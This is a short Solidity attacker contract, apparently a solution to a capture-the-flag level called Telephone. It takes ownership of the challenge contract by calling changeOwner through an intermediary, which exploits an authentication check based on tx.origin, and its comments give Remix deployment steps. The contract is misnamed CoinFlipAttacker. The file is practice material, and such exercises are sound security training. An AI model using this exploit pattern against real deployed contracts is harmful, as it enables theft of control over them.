// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - Call the attack function
// 3 - Check the owner: await contract.owner() - Chrome Console

pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract CoinFlipAttacker {
    ITelephone public telephone;

    constructor(address challengeAddress) public {
        telephone = ITelephone(challengeAddress);
    }

    function attack() external payable {
        // call telephone contract with sender address
        telephone.changeOwner(msg.sender);
    }
}
